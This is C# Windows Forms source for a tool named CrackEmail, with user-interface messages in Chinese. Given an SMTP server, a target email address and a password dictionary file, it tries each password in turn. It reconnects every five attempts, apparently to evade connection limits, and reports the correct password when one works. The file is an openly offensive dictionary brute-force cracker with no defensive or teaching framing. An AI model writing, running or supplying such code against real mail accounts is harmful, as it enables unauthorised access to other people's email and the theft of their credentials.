using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace CrackEmail
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnRun_Click(object sender, EventArgs e)
        {
            if ("".Equals(txtSmtp.Text.Trim()))
            {
                MessageBox.Show("服务地址不能为空!");
            }
            else if ("".Equals(txtMail.Text.Trim()))
            {
                MessageBox.Show("用户名不能为空!");
            }

            else if (!File.Exists(txtDict.Text))
            {
                MessageBox.Show("字典文件不存在!");
            }
            else
            {
                bool blnFlag = false;
                string[] strPwd;
                FileStream fs = null;
                StreamReader sr = null;
                MyMail mail = new MyMail(txtSmtp.Text);
                int i = 0;
                if (mail.Connect())
                {
                    fs = new FileStream(txtDict.Text, FileMode.Open, FileAccess.Read, FileShare.Read);
                    sr = new StreamReader(fs);
                    while (!sr.EndOfStream)
                    {
                        i++;
                        if (i > 5)
                        {
                            i = 0;
                            mail.DisConnect();
                            mail.Connect();
                        }
                        string strPass = sr.ReadLine();
                        if (mail.ValidateLogin(txtMail.Text, strPass) == 0)
                        {
                            blnFlag = true;
                            MessageBox.Show(string.Format("正确密码是:{0}", strPass));
                            break;
                        }
                    }
                }
                else
                {
                    MessageBox.Show("连接服务器失败!");
                }
                mail.DisConnect();
                mail = null;
                if (!blnFlag)
                {
                    MessageBox.Show("未找到密码!");
                }
                sr.Close();
                sr.Dispose();
                fs.Close();
                fs.Dispose();
                GC.Collect();
            }
        }

        private void txtDict_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                txtDict.Text = ofd.FileName;
            }
            ofd.Dispose();
            ofd = null;
        }
    }
}
